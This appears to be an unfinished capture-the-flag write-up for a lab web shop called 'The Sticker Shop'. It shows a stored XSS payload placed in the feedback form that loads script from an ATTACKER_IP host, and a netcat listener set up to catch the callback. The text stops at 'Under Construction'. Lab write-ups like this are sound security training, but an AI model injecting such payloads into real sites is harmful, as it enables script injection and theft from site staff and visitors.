# The Sticker Shop

Time: 120 minutes

Difficulty: Easy

## What is about?

This challenges challenge us on finding the flag on the webpage `http://MACHINE_IP:8080/flag.txt`. The story of this challenge is that my local sticker shop has finally developed its own webpage. However they do not have the experience and decided to host everything by themselves.

## Challenge

First we go to the page that the challenge gave us that is `http://MACHINE_IP:8080/flag.txt` and we do not have the permits to enter, with this obstacle we go to `http://MACHINE_IP:8080` which is a online shop for stickers. There is a sub page that is interesting and it is the feedback. By using curl we archieve nothing, we change or stategy by thinking that is possible a XSS attack by feedback. To answer this question we are going to put a payload on the feedback just like this `'"><script src=http://ATTACKER_IP:9999></script>` and in out terminal put a nc -lsvp 9999 to capture the conexion we establish with the payload. This test is sucessfull and we confirm that we can attack XSS.

The next step is having a script to give us the flag,

--Under Construction

## Conclusion
